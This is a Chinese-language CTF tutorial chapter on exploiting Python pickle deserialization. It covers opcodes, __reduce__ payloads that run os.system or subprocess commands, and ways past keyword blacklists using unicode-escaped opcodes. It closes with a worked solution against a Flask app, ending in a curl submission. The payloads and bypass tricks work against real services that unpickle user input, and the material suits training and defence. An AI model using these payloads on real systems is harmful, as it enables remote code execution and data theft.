---
comments: true
---

# Python反序列化

## 从 PHP 反序列化迁移过来

如果你已经学过 [PHP反序列化](./php_unser.md)，那么这一章会非常快，因为两者的漏洞模型几乎一一对应：

| | PHP | Python |
| --- | --- | --- |
| 序列化函数 | `serialize()` | `pickle.dumps()` |
| 反序列化函数 | `unserialize()` | `pickle.loads()` |
| 序列化结果 | 文本字符串（`O:4:"User":...`） | 二进制字节流（栈式虚拟机的指令序列） |
| 可控的触发点 | 魔术方法（`__wakeup`、`__destruct` 等） | `__reduce__` / `__reduce_ex__` 方法 |
| 利用思路 | 在题目已有的类里找 POP 链 | 直接在 payload 里指定要调用的函数 |

最大的区别在于：**PHP 的 `unserialize()` 只是还原数据结构 **，要执行代码必须依赖题目代码里已存在的类和魔术方法，串出一条 POP 链；而** pickle 的反序列化过程本身就是在一个虚拟机上逐条执行指令**，其中 `REDUCE` 这类指令的语义就是"调用某个函数"。也就是说，pickle 数据里可以直接携带"请调用 `os.system('xxx')`"这样的指令，不需要题目代码里存在任何可利用的类——只要服务端对用户输入调用了 `pickle.loads()`，天然就可能是 RCE。

所以做 Python 反序列化题，核心工作通常不是"找链"，而是：

1. 找到 `pickle.loads()` 的入口和过滤条件；
2. 生成（或手写）一段能绕过过滤、执行命令的 pickle 数据。

Python 官方文档对 `pickle` 的第一条警告就是："**永远不要反序列化来自不可信来源的数据**"。

## pickle 协议与 opcode 极简入门

### 序列化结果长什么样

`pickle` 目前一共有 0～5 共 6 个协议版本，版本越高越紧凑，但 **协议 0 是纯 ASCII 文本**，人可以直接读写，CTF 里手写 payload 一般都用它：

```python
import pickle

print(pickle.dumps([1, 'a'], protocol=0))
# b'(lp0\nI1\naVa\np1\na.'
```

看不懂没关系，Python 自带 `pickletools` 模块可以把字节流反汇编成一条条指令（opcode）：

```python
import pickle, pickletools

data = pickle.dumps([1, 'a'], protocol=0)
pickletools.dis(data)
```

输出：

```text
    0: (    MARK
    1: l        LIST       (MARK at 0)
    2: p    PUT        0
    5: I    INT        1
    8: a    APPEND
    9: V    UNICODE    'a'
   12: p    PUT        1
   15: a    APPEND
   16: .    STOP
highest protocol among opcodes = 0
```

### pickle 是一台栈式虚拟机

可以把 `pickle.loads()` 理解为一台小虚拟机的执行过程：它维护一个 **栈**，从左到右读取 opcode，逐条执行，直到遇到 `.`（STOP）时把栈顶元素作为反序列化的结果返回。反汇编上面那段数据，它做的事情是：

- `(` 压入一个 MARK 标记；
- `l` 弹出到 MARK 为止的内容，组装成 list；
- `I1` 压入整数 1，`a` 把它追加到 list 里；
- `Va` 压入字符串 `'a'`，再 `a` 追加；
- `.` 结束，返回栈顶的 list。

### 够用的 opcode 清单

不需要背全部 opcode，做题只需要认识下面这几个：

| opcode | 名称 | 作用 |
| --- | --- | --- |
| `c模块名\n函数名\n` | GLOBAL | 把"模块.函数"这个可调用对象压栈（protocol 0 写法） |
| `\x93` | STACK_GLOBAL | 从栈上弹出"函数名、模块名"两个字符串，压入对应的可调用对象（protocol 2+） |
| `(` | MARK | 压入一个标记 |
| `S'xxx'\n` / `Vxxx\n` | STRING / UNICODE | 压入字符串（`V` 支持 `\uXXXX` 转义，后面绕过要用） |
| `I123\n` | INT | 压入整数 |
| `t` | TUPLE | 弹出到 MARK 为止的内容，组成元组压栈 |
| `R` | REDUCE | 弹出元组和可调用对象，执行 `callable(*args)`，结果压栈 |
| `i模块名\n函数名\n` | INST | 类似 GLOBAL + REDUCE 的组合，直接调用 |
| `o` | OBJ | 用 MARK 之后的内容构造对象 |
| `b` | BUILD | 用栈顶 dict 更新对象的 `__dict__` |
| `.` | STOP | 结束，栈顶就是反序列化结果 |

关键就是 `R`：栈上放着"可调用对象"和"参数元组"，`R` 就把它们组合成一次真实的函数调用。一段最经典的手写 RCE opcode 长这样：

```text
cos
system
(S'echo pwned'
tR.
```

逐条读：`c` 压入 `os.system`；`(` 打标记；`S'echo pwned'` 压入字符串；`t` 组成元组 `('echo pwned',)`；`R` 执行 `os.system('echo pwned')`；`.` 结束。本地验证：

```python
import pickle
pickle.loads(b"cos\nsystem\n(S'echo pwned'\ntR.")  # 屏幕上打印 pwned
```

## `__reduce__` 魔术方法

手写 opcode 之前，大多数题目用 `__reduce__` 配合 `pickle.dumps()` 自动生成 payload 就够了。

`__reduce__` 是类的魔术方法，定义"这个对象被序列化时应该变成什么"。它最常见的返回形式是一个二元组：

```python
return (callable, (arg1, arg2, ...))
```

含义是：反序列化时，用 `callable(*args)` 来重建这个对象。pickle 会为它生成上面那种 `c...( t R .` 结构的 opcode。换句话说，**`__reduce__` 就是我们把任意函数调用塞进 pickle 数据的合法接口**——它之于 pickle，相当于 POP 链终点那个 `eval`/`system` 之于 PHP。

最小示例：

```python
import pickle, os

class RCE:
    def __reduce__(self):
        return (os.system, ('echo pwned',))

data = pickle.dumps(RCE(), protocol=0)
print(data)
# b'cposix\nsystem\np0\n(Vecho pwned\np1\ntp2\nRp3\n.'

pickle.loads(data)  # 反序列化的瞬间命令就执行了
```

注意输出里写的是 `cposix\nsystem\n` 而不是 `os`：Linux 上 `os.system` 的真实归属模块是 `posix`，pickle 按引用序列化时会记录真实模块名。这一点在做关键词黑名单题目时很重要，后面会用到。

两个补充，做题时知道即可：

- `__reduce_ex__(self, protocol)` 和 `__reduce__` 作用相同，只是多接收一个协议版本参数，且 **优先级更高**；两者都存在时以 `__reduce_ex__` 为准。
- `__reduce__` 除了二元组还能返回更多元素（设置对象状态、迭代器等），CTF 里基本用不到，够用了。

## 构造 RCE payload

### 用 `os` 执行命令

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('cat /flag',))

print(base64.b64encode(pickle.dumps(RCE())))
```

题目接收形式通常是 base64 或 URL 编码后的字符串（因为 pickle 数据是二进制），本地生成后提交即可。如果要回显结果，用 `os.popen('cmd').read` 不行——`os.popen` 返回的是文件对象，`pickle` 的 `R` 调用返回什么并不影响命令已经执行这个事实；需要回显一般用 `subprocess`。

### 用 `subprocess` 执行命令并拿到输出

```python
import pickle, base64, subprocess

class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/flag'],))

print(base64.b64encode(pickle.dumps(RCE())))
```

`subprocess.getoutput('cat /flag')`、`subprocess.call` 等同理，挑题目黑名单没拦的用。如果命令执行成功但页面没有回显，可以考虑把 flag 写到题目能读到的位置（比如源码文件、静态目录），或者用带外（DNSLog、反弹 shell）的方式把数据带出来——这和 [RCE](./rce.md) 一章里无回显命令执行的思路完全一样。

## 手写 opcode 与 pker

### 什么时候需要手写

`pickle.dumps()` 生成的 opcode 是"标准答案"：模块名、函数名以明文出现在字节流里，比如 `os`、`system`。一旦题目做了关键词黑名单，`dumps` 的产物往往直接撞墙。这时就需要 **手写 opcode**：opcode 只是字节流，同一个语义有很多种写法，黑名单通常挡不住。

手写流程固定三步：

1. 按前面的 opcode 表把指令拼成 `bytes`；
2. 本地 `pickle.loads()` 验证能执行；
3. `base64.b64encode` 后提交。

例如把 `os.system` 换成 protocol 2+ 的写法：

```python
import pickle, pickletools

payload = (b"Vos\n"          # 压入 'os'
           b"Vsystem\n"      # 压入 'system'
           b"\x93"           # STACK_GLOBAL -> os.system
           b"(S'echo pwned'\n"
           b"tR.")
pickletools.dis(payload)     # 检查每条指令是否符合预期
pickle.loads(payload)        # 本地验证
```

`pickletools.dis()` 在这里就是你的调试器：每条指令执行后栈的变化都能看出来，拼错了立刻能发现。另外 `pickletools.optimize()` 可以把一段 opcode 压缩到最短，payload 有长度限制时有用。

### pker 工具

GitHub 上有一个名为 **pker** 的开源工具，专门解决手写 opcode 的繁琐问题：你用它定义的一套抽象语法（`GLOBAL`、`INST`、`OBJ`、`REDUCE`、`BUILD` 等关键字，写法类似函数调用）描述想执行的操作，它自动生成对应的 pickle opcode，memo 编号之类的细节都帮你处理好。遇到需要构造复杂 payload（比如链式 `BUILD` 改对象属性）时比纯手写省心得多。工具的具体语法以项目 README 为准，安装使用前建议先在本地虚拟机里测试。

## 过滤绕过

### 黑名单挡的是"名字"，不是功能

黑名单检查的是 payload 字节流里有没有出现某些关键词，而执行同一个功能往往有多个等价的"入口名字"：

- `os` 被禁：换 `subprocess`、`posix`（Linux）、`nt`（Windows）；
- `system` 被禁：换 `os.popen`、`subprocess.getoutput` / `check_output` / `call`；
- 危险函数全被禁但 `builtins` 没禁：试试 `__import__('os').system(...)` 的思路，opcode 层面用 `cbuiltins\n__import__\n` 先把模块拿回来再组合调用；
- 实在没有命令执行函数可用，还可以降级为读写文件：`c__builtin__\nopen\n`（Python2）或 `cbuiltins\nopen\n` 读 flag，或用 `codecs`、`io` 模块。

### `sys.modules` 被改掉

有的题目会这样"禁用"模块：

```python
sys.modules['os'] = 'not allowed'
sys.modules['sys'] = 'not allowed'
```

这会让后续 `import os` 拿到一个字符串而不是模块，`cos\nsystem\n` 也就失效了。但这种防护挡不住 **别的模块**——直接用 `subprocess` 就行，它没被替换。本书 [PHP反序列化](./php_unser.md) 章末尾就有一道这样的 pickle 例题（`/ppicklee` 路由），可以对照着做。

### 字符串编码绕过关键词匹配

黑名单一般是这样写的：`if b'os' in pickle_data`。它匹配的是 **原始字节**，而 opcode 里的字符串是有编码余地的。`V`（UNICODE）指令支持 `\uXXXX` 转义：

```python
payload = (b"V\\u006fs\n"        # 解码后是 'os'，但字节流里没有 "os" 这两个字符
           b"Vsyste\\u006d\n"    # 解码后是 'system'
           b"\x93"
           b"(S'echo pwned'\n"
           b"tR.")
```

反序列化时 `V` 指令会把 `\u006f` 解码回 `'o'`，`STACK_GLOBAL` 拿到的还是 `os.system`，但黑名单的字节匹配扑空了。同理，`S` 指令里的 `\x` 转义、长短协议版本之间切换（`c` 换 `\x93`+`V`），都是"同一语义、不同字节"的绕过素材。

### RestrictedUnpickler

比黑名单更严格的写法是重写 `find_class()`，只允许白名单模块/函数被反序列化：

```python
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == 'builtins' and name in ('dict', 'list'):
            return super().find_class(module, name)
        raise pickle.UnpicklingError('forbidden')
```

因为 `c`、`i`、`\x93` 这些指令最终都会走到 `find_class()`，白名单之外的函数名编码得再花也进不来。这种题目的正确思路不是硬刚 opcode，而是 **审计白名单里放了什么**：如果白名单里混进了能间接执行代码的东西（比如某些库函数、题目自己写的类），就还有戏；如果白名单只有纯数据结构，那多半考点不在这里，回头找找别的入口。

## CTF 例题：一道黑名单过滤的 pickle

题目给出了 Web 服务的源码：

```python
from flask import Flask, request
import pickle
import base64

app = Flask(__name__)

blacklist = [b'os', b'system', b'eval', b'exec', b'open',
             b'flag', b'subprocess', b'builtins', b'import', b'pickle']

@app.route('/')
def index():
    return 'give me some pickles'

@app.route('/pickle', methods=['POST'])
def do_pickle():
    data = request.form.get('data', '')
    try:
        raw = base64.b64decode(data)
        for word in blacklist:
            if word in raw:
                return 'Hacker!'
        pickle.loads(raw)
        return 'pickle done'
    except Exception:
        return 'error'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

### 分析

- 入口在 `/pickle`，POST 参数 `data` 经 base64 解码后送进 `pickle.loads()`，典型反序列化点。
- 黑名单很长：`os`、`system`、`subprocess`、`builtins` 等常用名字全被按字节匹配拦掉了，连 `flag` 这个词都不能出现。
- 注意黑名单是 **字节匹配**，而且 `V` 指令的 `\uXXXX` 转义恰好能把任何字符编码成"不含原字符"的字节——突破口在这。

### 失败的尝试

先用标准流程生成 payload：

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('cat /flag',))

print(base64.b64encode(pickle.dumps(RCE())))
```

提交后返回 `Hacker!`。原因很明显：序列化结果里明文带着 `posix`（含 `os`）、`system`、`cat /flag`，一下撞上三个关键词。换 `subprocess.getoutput` 也一样——`subprocess` 本身就在黑名单里。

### 解题：手写 opcode + unicode 转义

思路：`V` 指令把模块名和函数名全部转义掉，让黑名单匹配不到任何关键词；命令里用通配符 `/f*` 代替 `/flag`（`subprocess.getoutput` 走 shell，通配符会展开；这里我们直接用 shell 命令字符串配合 `os.system` 也一样展开）。

```python
import base64, pickle, pickletools

payload = (b"V\\u006fs\n"         # 'os'
           b"Vsyste\\u006d\n"     # 'system'
           b"\x93"                # STACK_GLOBAL -> os.system
           b"(S'cat /f*'\n"       # 命令：/f* 展开为 /flag，且不含 "flag"
           b"tR.")

# 本地先验证指令序列正确、命令确实会执行
pickletools.dis(payload)
for word in [b'os', b'system', b'eval', b'exec', b'open',
             b'flag', b'subprocess', b'builtins', b'import', b'pickle']:
    assert word not in payload, word   # 确认不撞黑名单

print(base64.b64encode(payload).decode())
```

本地验证通过（执行 `cat /f*`，可用 `echo pwned` 之类的无害命令先测），且字节流中没有任何黑名单关键词。提交：

```bash
curl -X POST http://target:5000/pickle -d "data=<上面输出的base64>"
```

页面返回 `pickle done`，说明命令已执行。本题没有回显，把 flag 带出来的常用办法是写进能访问到的文件再读，例如把命令换成 `cp /f* /app/static/x` 之类（具体路径看题目环境），或者用带外通道。

回顾整条链路：找入口 → 试标准 `__reduce__` payload 撞黑名单 → 定位黑名单是字节匹配 → 用 `V` 转义 + 通配符手写 opcode 绕过。这也是大多数 pickle 题的通用节奏。

## 小结

- pickle 反序列化 = 在栈式虚拟机上执行 opcode，`R` 指令可以直接发起函数调用，所以 **不需要 POP 链**，payload 自带 RCE 能力。
- 平时用 `__reduce__` + `pickle.dumps()` 生成 payload；撞黑名单时手写 opcode，用 `pickletools.dis()` 调试。
- 绕过的本质是"同一语义、不同字节"：换模块名、换协议写法、`\uXXXX` 转义、通配符。
- 相关章节可交叉阅读：[PHP反序列化](./php_unser.md)（POP 链思路对照，章末另有 pickle 例题）、[RCE](./rce.md)（无回显时把结果带出来的方法）。
